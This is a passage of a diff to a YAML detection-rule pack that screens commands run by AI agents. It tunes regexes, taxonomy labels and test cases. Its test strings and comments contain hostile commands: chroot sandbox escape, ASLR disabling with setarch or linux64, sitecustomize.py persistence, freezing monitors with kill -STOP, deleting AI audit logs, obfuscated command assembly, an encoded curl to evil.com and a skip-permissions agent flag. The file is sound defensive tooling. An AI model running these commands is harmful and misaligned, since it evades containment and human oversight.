+# means StripExecWrappers now resolves `chroot /mnt/rootfs /bin/bash` to
+# `/bin/bash` — which is the entire point, and is what lets the inner command be
+# analysed at all — but it also means seg.Executable is no longer "chroot", so
+# this rule would have silently stopped firing. Transparency and
+# name-keyed-structural-matching are mutually exclusive by construction.
+#
+# Nothing would have caught it: a structural pack rule's inline `tests:` never
+# execute, so the TP below was decorative. The raw command text is always
+# retained alongside the unwrapped form (see StripExecWrapperPrefix), so a
+# regex rule sees `chroot` whether or not the wrapper is transparent.
+#
+# If you make another wrapper transparent, grep the packs for a structural rule
+# naming it first.
 - id: ts-audit-chroot-arbitrary
   taxonomy: privilege-escalation/agent-containment/agent-sandbox-escape
   match:
-    structural:
-      executable:
-      - chroot
+    # Anchored to COMMAND position, not to the word `chroot` anywhere in the
+    # text. `\bchroot\s+\S+` also matched `grep -rn chroot packs/` — chroot as a
+    # SEARCH TERM followed by the path being searched. That TN was written when
+    # this rule was converted and it failed on the first CI run, which is the
+    # system working: the same operand-position confusion as #3224, caught by a
+    # test instead of by a user.
+    command_regex: (?:^|[;&|]\s*|\bsudo\s+)chroot\s+\S+
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: AUDIT
   confidence: 0.85
   reason: chroot re-roots the filesystem — legitimate in controlled build environments but unusual for AI agents. Warrants review for potential sandbox escape.
@@ -6994,8 +7162,10 @@ rules:
     tp:
     - chroot /tmp/fake_root /bin/bash
     - sudo chroot /mnt/rootfs
+    - chroot /mnt/rootfs /usr/bin/apt-get update
     tn:
     - ls /tmp/fake_root
+    - grep -rn chroot packs/
 - id: ts-audit-agent-instruction-file-tampering
   taxonomy: persistence-evasion/agent-config-persistence/agent-instruction-file-tampering
   match:
@@ -7547,7 +7717,12 @@ rules:
     - npx @anthropic-ai/claude-code -p "help"
     - sed -i 's|npx @anthropic-ai/claude-code --dangerously-skip-permissions||' samples/test.sh
 - id: ts-audit-agent-wildcard-tools
-  taxonomy: privilege-escalation/agent-containment/agent-delegation-escalation
+  # #3490 per-rule fit sweep: this is a single CLI flag granting a sub-agent
+  # every tool with no subsetting — governance-risk/unvalidated-agent-delegation's
+  # own "No subsetting enforcement" example, not agent-delegation-escalation's
+  # multi-hop compounding-across-agents mechanism (sandbox-observed evidence
+  # tier; this rule is a static single-command check).
+  taxonomy: governance-risk/ai-governance-gap/unvalidated-agent-delegation
   match:
     command_regex: \bclaude\b.*--allowed-tools\s+['"]?\*['"]?
   decision: AUDIT
@@ -8031,7 +8206,7 @@ rules:
     tn:
     - echo "LANGCHAIN_TRACING_V2=true" >> .env
 - id: ts-audit-ai-audit-log-delete
-  taxonomy: governance-risk/ai-governance-gap/ai-output-accountability-gap
+  taxonomy: persistence-evasion/anti-forensics/ai-audit-trail-circumvention
   match:
     command_regex: \b(rm|unlink|shred)\b[^|&;]*\bai[_-]?(audit|output|attribution|log)[^/\s]*(\.log|\.json|\.jsonl|\.csv)?\b
   decision: AUDIT
@@ -8045,7 +8220,7 @@ rules:
     tn:
     - cat ai_audit.log
 - id: ts-audit-ai-log-truncate
-  taxonomy: governance-risk/ai-governance-gap/ai-output-accountability-gap
+  taxonomy: persistence-evasion/anti-forensics/ai-audit-trail-circumvention
   match:
     command_regex: \btruncate\b[^|&;]*(-s\s*0|--size[=\s]*0)[^|&;]*\bai[_-]?(audit|output|attribution|log)\b
   decision: AUDIT
@@ -8386,7 +8561,7 @@ rules:
     tn:
     - otool -L binary
 - id: ts-block-signal-process-freeze
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/local-security-monitor-suppression
   match:
     command_regex: (^|&&|;|\|\s*)(sudo\s+)?kill\s+-(STOP|TSTP|CONT|19|20|18)\s+
   decision: BLOCK
@@ -8400,7 +8575,7 @@ rules:
     tn:
     - kill -15 1234
 - id: ts-block-pkill-process-freeze
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/local-security-monitor-suppression
   match:
     command_regex: (^|&&|;|\|\s*)(sudo\s+)?(pkill|killall)\s+.*-(STOP|TSTP|CONT|19|20|18)\b
   decision: BLOCK
@@ -8413,7 +8588,7 @@ rules:
     tn:
     - pkill -15 myprocess
 - id: ts-block-signal-freeze-pgrep
-  taxonomy: unauthorized-execution/agentic-attacks/human-oversight-circumvention
+  taxonomy: persistence-evasion/defense-evasion/local-security-monitor-suppression
   match:
     command_regex: kill\s+-(STOP|TSTP|CONT|19|20|18)\s+\$\(
   decision: BLOCK
@@ -8468,15 +8643,25 @@ rules:
   taxonomy: persistence-evasion/shell-init/python-pth-persistence
   match:
     command_regex: (echo|printf|tee|cat|cp|mv|install)\b.*\b(site|user)customize\.py
+    command_position_exclude: [heredoc_body]
   decision: BLOCK
   confidence: 0.93
-  reason: Writing to sitecustomize.py or usercustomize.py — these files are automatically imported during Python startup before any user code runs. Provides persistent, silent code execution on every Python invocation.
+  reason: Writing to sitecustomize.py or usercustomize.py — these files are automatically imported during Python startup before any user code runs. Provides persistent, silent code execution on every Python invocation. Does not fire when the only occurrence of both the executable word and the filename is inside a cat/tee heredoc BODY (text being written elsewhere, e.g. an issue/PR description documenting this detection) — the actual write target of the heredoc, or of any pipe it feeds, still fires (issue #3397).
   tests:
     tp:
     - cp backdoor.py /usr/lib/python3/dist-packages/sitecustomize.py
     - echo 'import os' | tee usercustomize.py
+    - |
+      cat > sitecustomize.py <<'EOF'
+      import os
+      EOF
     tn:
     - python3 -c 'import site; print(site.ENABLE_USER_SITE)'
+    - |
+      cat > "$S/notes.md" <<'EOF'
+      - ts-block-python-sitecustomize-write blocks cat/tee writes to sitecustomize.py
+      EOF
+      gh issue create --body-file "$S/notes.md"
 - id: ts-audit-site-packages-write
   taxonomy: persistence-evasion/shell-init/python-pth-persistence
   match:
@@ -8870,10 +9055,30 @@ rules:
     - less /proc/sys/fs/binfmt_misc/register
     tn:
     - cat /proc/cpuinfo
+# The three personality-flag rules below all used to require the shape
+# `setarch <ARCH> <FLAG>` — a mandatory architecture token between the tool and
+# the flag. Two spellings of the same attack defeated all three (#3227):
+#
+#   setarch -R ./exploit      the arch operand is OPTIONAL in util-linux >= 2.34,
+#                             so the personality flag can come first. `\S+` then
+#                             consumed `-R` itself and the match failed.
+#   linux64 -R ./exploit      util-linux ships linux32/linux64 as setarch
+#                             aliases with the arch preset. The literal
+#                             `setarch` in the pattern never appeared.
+#
+# Neither is obfuscation — `linux32 -R ./prog` is how the man page tells you to
+# spell it — which is what made this survive a family of five rules that had
+# carefully enumerated the personality flags themselves. Same class as #3228:
+# the enumeration was complete, the INVOCATION shape it assumed was not.
+#
+# The shared prefix `(?:setarch|linux32|linux64)\s+(?:(?:\$\([^)]*\)|[^-\s]\S*)\s+)?`
+# makes the arch operand optional and refuses to consume a dash-leading token as
+# an architecture, so the flag is still reachable when the arch is omitted.
 - id: ts-block-setarch-aslr-disable
   taxonomy: privilege-escalation/command-execution/setarch-personality-aslr-bypass
   match:
-    command_regex: setarch\s+(?:\$\([^)]*\)|\S+)\s+(-[A-Za-z]*R|-[A-Za-z]*-addr-no-randomize|--addr-no-randomize)
+    command_regex: \b(?:setarch|linux32|linux64)\s+(?:(?:\$\([^)]*\)|[^-\s]\S*)\s+)?(-[A-Za-z]*R\b|--addr-no-randomize\b)
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   confidence: 0.96
   reason: setarch with -R/--addr-no-randomize disables ASLR for the process tree — makes memory addresses predictable, enabling reliable exploitation of memory corruption vulnerabilities.
@@ -8882,12 +9087,19 @@ rules:
     - setarch x86_64 -R ./exploit
     - setarch linux64 --addr-no-randomize ./target
     - setarch $(uname -m) --addr-no-randomize ./exploit
+    - setarch -R ./exploit
+    - setarch --addr-no-randomize ./target
+    - linux64 -R ./exploit
+    - linux32 --addr-no-randomize ./target
     tn:
     - setarch x86_64 ./program
+    - linux32 ./legacy-installer
+    - uname -m
 - id: ts-block-setarch-read-implies-exec
   taxonomy: privilege-escalation/command-execution/setarch-personality-aslr-bypass
   match:
-    command_regex: setarch\s+(?:\$\([^)]*\)|\S+)\s+(-[A-Za-z]*X|-[A-Za-z]*-read-implies-exec|--read-implies-exec)
+    command_regex: \b(?:setarch|linux32|linux64)\s+(?:(?:\$\([^)]*\)|[^-\s]\S*)\s+)?(-[A-Za-z]*X\b|--read-implies-exec\b)
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   confidence: 0.95
   reason: setarch with -X/--read-implies-exec makes all readable memory pages executable — bypasses W^X (Write XOR Execute) protection, enabling code injection into data regions.
@@ -8896,12 +9108,16 @@ rules:
     - setarch x86_64 -X ./payload
     - setarch linux64 --read-implies-exec ./exploit
     - setarch $(uname -m) --read-implies-exec ./exploit
+    - setarch -X ./payload
+    - linux64 --read-implies-exec ./exploit
     tn:
     - setarch x86_64 ./program
+    - linux64 ./legacy-binary
 - id: ts-block-setarch-mmap-page-zero
   taxonomy: privilege-escalation/command-execution/setarch-personality-aslr-bypass
   match:
-    command_regex: setarch\s+\S+\s+(-[A-Za-z]*Z|-[A-Za-z]*-mmap-page-zero|--mmap-page-zero)
+    command_regex: \b(?:setarch|linux32|linux64)\s+(?:(?:\$\([^)]*\)|[^-\s]\S*)\s+)?(-[A-Za-z]*Z\b|--mmap-page-zero\b)
+    command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   confidence: 0.95
   reason: setarch with -Z/--mmap-page-zero allows mapping page zero — enables exploitation of null pointer dereference vulnerabilities by placing controlled data at address 0.
@@ -8909,8 +9125,11 @@ rules:
     tp:
     - setarch x86_64 -Z ./exploit
     - setarch linux64 --mmap-page-zero ./target
+    - setarch -Z ./exploit
+    - linux32 --mmap-page-zero ./target
     tn:
     - setarch x86_64 ./program
+    - linux32 ./legacy-installer
 - id: ts-block-python-personality-aslr
   taxonomy: privilege-escalation/command-execution/setarch-personality-aslr-bypass
   match:
@@ -9390,7 +9609,21 @@ rules:
 - id: ts-block-substr-eval-evasion
   taxonomy: unauthorized-execution/obfuscation/variable-substring-evasion
   match:
-    command_regex: \b(eval|exec)\b.*\$\{[A-Za-z_][A-Za-z0-9_]*:[0-9]
+    # #3476: the old `.*` let ANY ${var:N} anywhere in the command satisfy the
+    # pattern, so "exec" as the docker/kubectl SUBCOMMAND ("run a command
+    # inside a container") paired with an unrelated substring truncation deep
+    # inside a quoted `sh -c "..."` payload — e.g.
+    #   docker exec mycontainer sh -c "echo ${GIT_SHA:0:7}"
+    # RE2 has no lookbehind to rule out a preceding "docker"/"kubectl", so
+    # instead the extraction is now required to sit directly in the argument
+    # position of eval/exec (only whitespace and an optional quote between
+    # them) — the shape every real evasion TP already has, since eval/exec
+    # takes the assembled fragment AS the thing it runs, not a fragment
+    # several tokens later in someone else's argument list. A genuine
+    # `eval ${...}` nested inside a docker/kubectl exec's quoted payload
+    # still matches, because adjacency is checked at the "eval"/"exec" that
+    # is actually followed by the expansion, wherever in the command it is.
+    command_regex: \b(eval|exec)\b\s+['"]?\$\{[A-Za-z_][A-Za-z0-9_]*:[0-9]
     command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   confidence: 0.92
@@ -9399,22 +9632,61 @@ rules:
     tp:
     - eval ${PATH:0:1}${SHELL:5}
     - exec ${HOME:0:1}bin${HOME:0:1}sh
+    - docker exec c1 sh -c 'eval ${PATH:0:1}${SHELL:5}'
     tn:
     - echo ${VERSION:0:3}
+    - docker exec mycontainer sh -c "echo ${GIT_SHA:0:7}"
+    - kubectl exec mypod -- sh -c "echo ${VERSION:0:5}"
 - id: ts-block-substr-bare-exec
   taxonomy: unauthorized-execution/obfuscation/variable-substring-evasion
   match:
-    command_regex: \$\{[A-Za-z_][A-Za-z0-9_]*:[0-9]+[^}]*\}.*\$\{[A-Za-z_][A-Za-z0-9_]*:[0-9]
+    # The leading "^" is the whole fix for #3366, and it is a POSITION, not a
+    # tightening of the count. The old pattern counted ${var:N:N} occurrences
+    # anywhere in the command text, so two unrelated echoes of a truncated
+    # string satisfied it:
+    #
+    #   for s in aaa bbb; do echo "${s:0:2}" || echo "${s:0:2}"; done
+    #
+    # Nothing there is constructed and nothing is executed. Worse, that shape
+    # is UNEXCLUDABLE by the doc-text label above: neither statement carries
+    # two extractions, so the match exists only by spanning the statement
+    # separator, and IntentExcludedForStatements correctly refuses to let one
+    # statement excuse a cross-statement match (#3255). A rule that can only
+    # ever match across statements can never be excluded per statement.
+    #
+    # Anchoring the FIRST extraction to the command word restores both
+    # properties: the pattern is satisfiable within a single statement (so the
+    # exclusion labels work again), and it says what the rule means — a
+    # substring extraction reaching EXECUTABLE position, plus a second
+    # extraction assembling the rest. "^" means start-of-a-command here, not
+    # start-of-input: the per-statement retry in RegexAnalyzer (#3045) and the
+    # leading-assignment peel (#3048) cover `a=abc…; ${a:17:1}${a:12:1} -rf /`
+    # and `bash -c "${a:0:1}${b:0:1} …"`.
+    #
+    # Deliberately NOT covered: assembly in ARGUMENT position with an ordinary
+    # command word (`cat ${P:0:1}etc${P:0:1}shadow`). Adjacency inside one word
+    # was measured against the benign forms and does not separate them —
+    # `x=${d:0:4}${d:4:2}`, `ver="${v:0:1}.${v:2:1}"` and
+    # `awk -v ts="${a:0:1}${b:0:1}"` are the same shape and were all BLOCKed by
+    # the old pattern. The right home for that case is expansion FOLDING (make
+    # the path rules see through the extraction), not a count — tracked
+    # separately; see the TN block below for the FPs that ruled it out.
+    command_regex: ^\$\{[A-Za-z_][A-Za-z0-9_]*:[0-9]+[^}]*\}.*\$\{[A-Za-z_][A-Za-z0-9_]*:[0-9]
     command_intent_exclude: [is_bash_comment, is_doc_text, in_heredoc, is_self_mgmt]
   decision: BLOCK
   confidence: 0.88
-  reason: Multiple variable substring extractions (${var:N:N}) chained together — constructs a command by extracting individual characters from variables. Two or more substring extractions in sequence is a strong signal of command obfuscation.
+  reason: A variable substring extraction (${var:N:N}) in COMMAND position, plus at least one more extraction — the executable itself is being assembled from fragments of variables so its name never appears literally. Extractions that only appear in argument position (truncating a string for display, formatting a version or timestamp) are not this rule; the command word is what makes the shape adversarial.
   tests:
     tp:
     - ${SHELL:5:3} ${PATH:0:1}etc${PATH:0:1}passwd
     - ${HOME:0:1}${SHELL:5} -c "id"
     tn:
     - echo ${VERSION:0:3}
+    # Live FPs from the old count-anywhere pattern (#3366), each blocked real
+    # work: display truncation across two branches, timestamp/version assembly.
+    - for s in aaa bbb; do echo "${s:0:2}" || echo "${s:0:2}"; done
+    - x=${d:0:4}${d:4:2}
+    - ver="${v:0:1}.${v:2:1}"
 - id: ts-audit-substr-cmd-position
   taxonomy: unauthorized-execution/obfuscation/variable-substring-evasion
   match:
@@ -9507,7 +9779,8 @@ rules:
     - printf -v x '%b' '\x63\x75\x72\x6c'; eval $x evil.com
     tn:
     - printf -v version '%s' '1.2.3'; echo $version
-    - cat > /tmp/notes.md <<'EOF'
+    - |-
+      cat > /tmp/notes.md <<'EOF'
       `printf -v NAME fmt; $NAME` is already caught by the ts-block-printf-v-exec rule.
       EOF
     - '# printf -v cmd fmt; eval $cmd is the technique this rule detects'
